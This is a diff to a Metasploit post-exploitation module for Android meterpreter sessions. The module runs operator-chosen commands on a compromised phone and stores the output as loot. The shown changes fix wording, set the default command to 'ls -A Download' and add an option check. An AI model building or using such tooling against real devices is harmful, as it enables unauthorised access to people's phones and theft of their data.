@@ -11,19 +11,20 @@
 # [ android_aux.rb ]
 # Author: pedr0 Ubuntu [r00t-3xp10it]
 # tested on:
-# P.O.C https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC[ERB]/metasploit-API/writing_a_linux_post_module_from_scratch.md
+# P.O.C:
 #
 #
 # [ POST-EXPLOITATION MODULE DESCRIPTION ]
-# Android/meterpeter payloads does not allow users to manipulate target file system. This msf post-exploitation
+# Android/meterpreter payloads does not allow users to manipulate target file system. This msf post-exploitation
 # module will allow users to input/execute remotely commands in target system, display on screen the command outputs
-# and stores the command outputs into ~/msf4/loot folder for later review .
+# and stores the command outputs into ~/msf4/loot folder for later review (set STORE_LOOT true).
 #
 #
 # [ MODULE OPTIONS ]
 # The session number to run this module on     => set SESSION 3
 # Store dumped data to msf4/loot folder?       => set STORE_LOOT true
-# Agressive system fingerprints scan?          => set EXEC_COMMAND ls Download
+# Agressive system fingerprints scan?          => set EXEC_COMMAND <command>
+# example: set EXEC_COMMAND ls -A Download
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
@@ -81,12 +82,12 @@ class MetasploitModule < Msf::Post
                 super(update_info(info,
                         'Name'          => 'android auxiliary post-module',
                         'Description'   => %q{
-                                        Android/meterpeter payloads does not allow users to manipulate target file system. This msf post-exploitation module will allow users to input/execute remotely commands in target system, display on screen the command outputs and stores the command outputs into ~/msf4/loot folder for later review .
+                                        Android/meterpreter payloads does not allow users to manipulate target file system. This msf post-exploitation module will allow users to input/execute remotely commands in target system, display on screen the command outputs and stores the command outputs into ~/msf4/loot folder for later review (set STORE_LOOT true).
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
                                 [
-                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author :D
+                                        'Module Author: r00t-3xp10it', # post-module author :D
                                 ],
  
                         'Version'        => '$Revision: 1.1',
@@ -108,7 +109,7 @@ class MetasploitModule < Msf::Post
 			'DefaultOptions' =>
 				{
 					'SESSION' => '1',   # Default its to run againts session 1
-                                        'EXEC_COMMAND' => 'ls Download', # command to execute remote
+                                        'EXEC_COMMAND' => 'ls -A Download', # command to execute remote
 				},
                         'SessionTypes'   => [ 'meterpreter' ]
  
@@ -152,6 +153,17 @@ def run
   print_line("    Client UID          : #{runtor}")
   print_line("")
   print_line("")
+
+
+    #
+    # check for proper config settings enter
+    # to prevent 'unset all' from deleting default options ..
+    #
+    if datastore['EXEC_COMMAND'] == 'nil'
+      print_error("Options not configurated correctly ..")
+      print_warning("Please set EXEC_COMMAND <command>")
+      return nil
+    end
     #
     # Check if we are running in an higth integrity context (root)
     #
@@ -174,7 +186,7 @@ def run
 
       #
       # Single_command to execute remotely (user inputs) ..
-      # if sellected previous in advanced options (set EXEC_COMMAND ls Download) ..
+      # if sellected previous in option (set EXEC_COMMAND <command>) ..
       #
       exec_comm = datastore['EXEC_COMMAND']
         # check if single_command option its configurated ..
